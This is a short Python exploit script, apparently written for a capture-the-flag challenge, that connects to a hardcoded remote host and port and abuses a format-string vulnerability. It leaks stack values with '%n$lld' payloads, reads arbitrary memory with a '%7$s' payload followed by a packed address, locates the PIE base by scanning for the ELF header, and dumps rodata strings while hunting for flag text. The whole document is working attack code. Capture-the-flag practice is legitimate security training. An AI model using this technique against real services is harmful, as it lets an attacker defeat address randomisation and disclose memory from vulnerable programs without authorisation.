#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300)
def ask(fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.12)
    try: return s.recv(4096)
    except Exception as e: return b'<T:'+str(e).encode()
def leak_lld(n):
    d=ask("%%%d$lld" % n)
    m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(X):
    fmt = b"%7$s" + b"AAAA" + struct.pack("<Q", X)
    return ask(fmt)

a15=leak_lld(15); start=a15 & ~0xfff
pie=None
for delta in range(0,0x20000,0x1000):
    X=start-delta; r=readmem(X)
    if r.startswith(b'\x7fELF'): pie=X; break
print("PIE=",hex(pie))
# read rodata strings: start at base+0x2000, walk string by string
addr = pie + 0x2000
strings=[]
for i in range(300):
    r = readmem(addr)
    # r = <string> + "AAAA" + pad
    # strip the trailing "AAAA"+Xbytes
    strb = r
    if b'AAAA' in r:
        strb = r.split(b'AAAA')[0]
    if not strb:
        # empty -> try advancing
        addr += 1
        continue
    if any(b in strb for b in [b'PTITCTF', b'flag', b'GZCTF', b'{', b'}' ]) or len(strb)<80:
        strings.append((addr, strb))
    addr += len(strb) + 1
    if addr > pie+0x5000:
        break
print("=== strings ===")
for a,sb in strings:
    print(hex(a), repr(sb[:120]))
s.close()
